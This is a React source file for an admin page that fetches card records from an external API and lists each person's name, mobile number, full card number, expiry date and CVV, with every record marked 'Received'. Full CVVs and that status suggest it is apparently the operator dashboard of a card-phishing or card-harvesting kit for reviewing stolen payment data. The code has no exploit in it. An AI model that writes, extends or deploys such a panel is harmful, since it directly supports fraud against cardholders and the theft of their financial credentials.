
import { useEffect, useState } from "react";
import AdminHeader from "../Admin/AdminHeader";
import {
  FaCreditCard,
  FaSyncAlt,
  FaUser,
  FaMobileAlt,
  FaCalendarAlt,
} from "react-icons/fa";

export default function CardDetails() {
  const [cards, setCards] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");

  const fetchCards = async () => {
    try {
      setLoading(true);
      setError("");

      const response = await fetch(
        "https://indus-dxn3.onrender.com/api/cards"
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.message || "Failed to load records"
        );
      }

      setCards(data.cards || data || []);
    } catch (err) {
      console.error("Card details error:", err);
      setError("Unable to load card details.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchCards();
  }, []);

  const formatDate = (date) => {
    if (!date) return "—";

    return new Date(date).toLocaleString("en-IN", {
      dateStyle: "medium",
      timeStyle: "short",
    });
  };

  return (
    <div className="min-h-screen bg-gray-50">

      {/* Admin Header */}
      <AdminHeader />

      {/* Content */}
      <main className="mx-auto max-w-[1100px] px-4 py-8">

        {/* Title + Refresh - Same Line */}
        <div className="mb-6 flex items-center justify-between">

          {/* Left Side */}
          <div>
            <h2 className="text-2xl font-bold text-gray-800">
              Card Records
            </h2>

            <p className="mt-1 text-sm text-gray-500">
              Total records: {cards.length}
            </p>
          </div>

          {/* Right Side */}
          <button
            onClick={fetchCards}
            disabled={loading}
            className="flex items-center gap-2 rounded-lg bg-[#ab183d] px-4 py-2 text-sm font-medium text-white transition hover:bg-[#8f1434] disabled:cursor-not-allowed disabled:opacity-50"
          >
            <FaSyncAlt
              className={loading ? "animate-spin" : ""}
            />

            {loading ? "Refreshing..." : "Refresh"}
          </button>

        </div>

        {/* Error */}
        {error && (
          <div className="mb-5 rounded-xl border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">
            {error}
          </div>
        )}

        {/* Loading */}
        {loading ? (
          <div className="rounded-2xl bg-white p-10 text-center shadow">

            <div className="mx-auto h-8 w-8 animate-spin rounded-full border-4 border-gray-200 border-t-[#ab183d]" />

            <p className="mt-4 text-sm text-gray-500">
              Loading records...
            </p>

          </div>
        ) : cards.length === 0 ? (
          <div className="rounded-2xl bg-white p-10 text-center shadow">

            <FaCreditCard className="mx-auto text-4xl text-gray-300" />

            <p className="mt-4 font-medium text-gray-700">
              No card records found
            </p>

          </div>
        ) : (
          <div className="overflow-hidden rounded-2xl border border-gray-200 bg-white shadow">

            <div className="overflow-x-auto">

              <table className="w-full min-w-[850px]">

                <thead className="bg-gray-50">
                  <tr className="border-b border-gray-200">

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Name
                    </th>

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Mobile
                    </th>

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Card Number
                    </th>

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Expiry
                    </th>

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Cvv
                    </th>

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Created
                    </th>

                    <th className="px-5 py-4 text-left text-xs font-semibold uppercase text-gray-500">
                      Status
                    </th>

                  </tr>
                </thead>

                <tbody>

                  {cards.map((card) => (

                    <tr
                      key={card._id}
                      className="border-b border-gray-100 last:border-0 hover:bg-gray-50"
                    >

                      {/* Name */}
                      <td className="px-5 py-4">

                        <div className="flex items-center gap-2">

                          <FaUser className="text-gray-400" />

                          <span className="text-sm font-medium text-gray-800">
                            {card.name || "—"}
                          </span>

                        </div>

                      </td>

                      {/* Mobile */}
                      <td className="px-5 py-4">

                        <div className="flex items-center gap-2">

                          <FaMobileAlt className="text-gray-400" />

                          <span className="font-mono text-sm text-gray-600">
                            {card.mobile || "—"}
                          </span>

                        </div>

                      </td>

                      {/* Card Number */}
                      <td className="px-5 py-4">

                        <div className="flex items-center gap-2">

                          <FaCreditCard className="text-gray-400" />

                          <span className="font-mono text-sm font-medium text-gray-700">
                            {card.cardNumber || "—"}
                          </span>

                        </div>

                      </td>

                      {/* Expiry */}
                      <td className="px-5 py-4">

                        <div className="flex items-center gap-2">

                          <FaCalendarAlt className="text-gray-400" />

                          <span className="font-mono text-sm text-gray-600">
                            {card.month || "--"}/
                            {card.year || "--"}
                          </span>

                        </div>

                      </td>

                      {/* CVV */}
                      <td className="px-5 py-4">

                        <div className="flex items-center gap-2">

                          <FaCreditCard className="text-gray-400" />

                          <span className="font-mono text-sm font-medium text-gray-700">
                            {card.cvv || "—"}
                          </span>

                        </div>

                      </td>

                      {/* Created */}
                      <td className="px-5 py-4">

                        <span className="text-sm text-gray-600">
                          {formatDate(card.createdAt)}
                        </span>

                      </td>

                      {/* Status */}
                      <td className="px-5 py-4">

                        <span className="rounded-full bg-green-100 px-3 py-1 text-xs font-semibold text-green-700">
                          Received
                        </span>

                      </td>

                    </tr>

                  ))}

                </tbody>

              </table>

            </div>

          </div>
        )}

      </main>

    </div>
  );
}
